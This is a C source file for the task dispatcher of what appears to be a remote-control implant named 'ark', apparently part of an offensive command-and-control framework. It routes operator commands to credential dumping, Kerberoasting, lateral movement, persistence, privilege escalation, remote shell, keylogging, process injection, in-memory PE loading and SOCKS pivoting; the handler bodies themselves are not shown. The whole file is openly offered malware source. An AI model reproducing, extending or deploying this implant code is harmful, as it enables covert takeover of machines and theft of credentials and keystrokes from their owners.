#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include "ark/modules.h"
#include "ark/pb_c2.h"
#include "ark/task_handlers.h"
#include "ark/tasks.h"

static void apply_handler_failure(ark_task_result *r, const char *fallback) {
    if (r->data && r->data_len > 0) {
        size_t n = r->data_len < sizeof(r->error) - 1 ? r->data_len : sizeof(r->error) - 1;
        memcpy(r->error, r->data, n);
        r->error[n] = '\0';
        free(r->data);
        r->data = NULL;
        r->data_len = 0;
    } else {
        strncpy(r->error, fallback, sizeof(r->error) - 1);
        r->error[sizeof(r->error) - 1] = '\0';
    }
    r->success = 0;
}

static int run_handler(int (*fn)(const uint8_t *, size_t, uint8_t **, size_t *),
    const ark_task *task, ark_task_result *r) {
    if (!fn(task->data, task->data_len, &r->data, &r->data_len)) {
        apply_handler_failure(r, "task handler failed");
        return 0;
    }
    r->success = 1;
    return 1;
}

static int run_handler_noarg(int (*fn)(uint8_t **, size_t *), ark_task_result *r) {
    if (!fn(&r->data, &r->data_len)) {
        apply_handler_failure(r, "task handler failed");
        return 0;
    }
    r->success = 1;
    return 1;
}

/* Dedicated TaskTypes share one adapter onto the compiled-in module registry.
 * Keep this table in lockstep with implant/tasks/modules.go. */
static ark_module_fn typed_module_fn(int32_t task_type) {
    static const struct {
        int32_t          type;
        ark_module_fn fn;
    } routes[] = {
        { ARK_TASK_CREDS_DUMP,   ark_mod_creds_dump },
        { ARK_TASK_LDAP_ENUM,    ark_mod_ldap_enum },
        { ARK_TASK_KERBEROAST,   ark_mod_kerberoast },
        { ARK_TASK_ASREPROAST,   ark_mod_asreproast },
        { ARK_TASK_LATERAL_MOVE, ark_mod_lateral_move },
        { ARK_TASK_PERSIST,      ark_mod_persist },
        { ARK_TASK_PRIVESC,      ark_mod_privesc },
    };
    for (size_t i = 0; i < sizeof(routes) / sizeof(routes[0]); i++) {
        if (routes[i].type == task_type)
            return routes[i].fn;
    }
    return NULL;
}

ark_task_result ark_execute_task(const ark_task *task) {
    ark_task_result r;
    memset(&r, 0, sizeof(r));
    if (!task) {
        snprintf(r.error, sizeof(r.error), "null task");
        return r;
    }
    strncpy(r.task_id, task->task_id, sizeof(r.task_id) - 1);
    r.task_id[sizeof(r.task_id) - 1] = '\0';

    clock_t start = clock();

    ark_module_fn typed = typed_module_fn(task->task_type);
    if (typed) {
        run_handler(typed, task, &r);
        goto done;
    }

    switch (task->task_type) {
    case ARK_TASK_SHELL:
        run_handler(ark_task_shell_execute, task, &r);
        break;
    case ARK_TASK_FILE_DOWNLOAD:
        run_handler(ark_task_file_download, task, &r);
        break;
    case ARK_TASK_FILE_UPLOAD:
        run_handler(ark_task_file_upload, task, &r);
        break;
    case ARK_TASK_PROCESS_LIST:
        run_handler_noarg(ark_task_process_list, &r);
        break;
    case ARK_TASK_PROCESS_KILL:
        run_handler(ark_task_process_kill, task, &r);
        break;
    case ARK_TASK_NET_IFCONFIG:
        run_handler_noarg(ark_task_net_ifconfig, &r);
        break;
    case ARK_TASK_NET_PORTSCAN:
        run_handler(ark_task_net_portscan, task, &r);
        break;
    case ARK_TASK_SCREENSHOT:
        run_handler(ark_task_screenshot, task, &r);
        break;
    case ARK_TASK_KEYLOG_START:
        run_handler(ark_task_keylog_start, task, &r);
        break;
    case ARK_TASK_KEYLOG_STOP:
        run_handler(ark_task_keylog_stop, task, &r);
        break;
    case ARK_TASK_KEYLOG_DUMP:
        run_handler(ark_task_keylog_dump, task, &r);
        break;
    case ARK_TASK_INJECT:
        run_handler(ark_task_inject, task, &r);
        break;
    case ARK_TASK_MODULE:
        if (!ark_task_module(task->data, task->data_len, &r.data, &r.data_len)) {
            apply_handler_failure(&r, "module execution failed or unknown module");
        } else {
            r.success = 1;
        }
        break;
    case ARK_TASK_EXIT:
    case ARK_TASK_SLEEP:
        r.success = 1;
        break;
    case ARK_TASK_PE_LOAD:
    case ARK_TASK_PE_LOAD_EXEC:
        run_handler(ark_task_peload, task, &r);
        break;
    case ARK_TASK_SOCKS_START:
        run_handler(ark_task_socks_start, task, &r);
        break;
    case ARK_TASK_SOCKS_STOP:
        run_handler(ark_task_socks_stop, task, &r);
        break;
    case ARK_TASK_PIVOT_START:
    case ARK_TASK_PIVOT_STOP:
        snprintf(r.error, sizeof(r.error), "not supported: pivot (use socks)");
        r.success = 0;
        break;
    case ARK_TASK_UNKNOWN:
    default:
        snprintf(r.error, sizeof(r.error), "unsupported task type: %d", task->task_type);
        r.success = 0;
        break;
    }

done:
    r.execution_time_ms = (int64_t)((clock() - start) * 1000 / CLOCKS_PER_SEC);
    return r;
}
